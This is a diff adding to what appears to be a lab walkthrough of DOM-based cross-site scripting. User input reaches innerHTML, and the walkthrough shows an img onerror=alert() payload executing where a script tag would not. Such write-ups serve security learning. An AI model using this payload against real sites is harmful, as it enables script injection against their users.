@@ -63,5 +63,22 @@ This string is passed to the JS function and used with the innerHTML.
 DOM in which the input is diplayed:
 
 ```html
+<span id="searchMessage">uniquetest</span>
+```
 
+In innerHTML if we pass a <script> tag it won't be executed. This is a security feature. So we need to pass something else.
+
+### Exploit
+We can use:
+```
+<img src='0' onerror=alert()>
+```
+The src provided will cause an error and onerror we load the alert() function.
+As we seen before the "script" tag is not executed but not the "img" tag.
+
+The DOM modified is the following:
+```html
+<span id="searchMessage">
+    <img src="0" onerror="alert()">
+</span>
 ```
